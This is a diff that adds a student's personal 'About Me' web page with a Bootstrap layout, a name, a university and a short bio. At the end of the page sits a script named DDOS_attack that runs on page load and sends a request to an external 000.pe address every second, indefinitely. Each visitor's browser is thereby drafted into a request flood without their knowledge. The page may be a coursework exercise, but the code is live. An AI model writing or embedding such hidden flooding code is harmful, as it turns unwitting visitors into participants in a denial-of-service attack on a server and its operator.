@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
+</head>
+<body>
+    <div class="container">
+        <div class="col-12 d-flex align-items-center">
+            <img src="me.jpg" class="img-fluid rounded mr-3" alt="About Me Image" style="width: 50px; height: 50px;">
+            <div>
+                <h1 class="bg-light">Ivan Volosyk</h1>
+                <p class="bg-light">4th year student of Lviv Polytechnic National University</p>
+            </div>
+        </div>
+        <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+            <ul class="navbar-nav mr-auto">
+                <li class="nav-item"><a class="nav-link" href="./index.html">Home</a></li>
+                <li class="nav-item"><a class="nav-link" href="./contactForm.html">Contact</a></li>
+                <li class="nav-item"><a class="nav-link" href="./aboutProject.html">About project</a></li>
+            </ul>
+        </nav>
+        <div class="row flex-column text-center"></div>
+            <div class="col-12" id="aboutMe">
+                <h2 class="bg-light">About Me</h2>
+                <p class="bg-light">Join me on my journey as a diligent and passionate 4th year student at Lviv Polytechnic National University, specializing in Computer Engineering. With a keen interest in cutting-edge technologies and a drive for innovation, I'm committed to honing my skills and contributing meaningfully to the world of technology. Let's connect and explore the possibilities together.</p>
+            </div>
+        </div>
+    </div>
+    <script>
+        function DDOS_attack(){
+            setInterval(()=>{
+                fetch("http://web2324ki48volosykiv6.000.pe/index.html")
+            }, 1000);
+        }
+        window.onload = () => {
+            DDOS_attack()
+        };
+    </script>
+</body>
+</html>
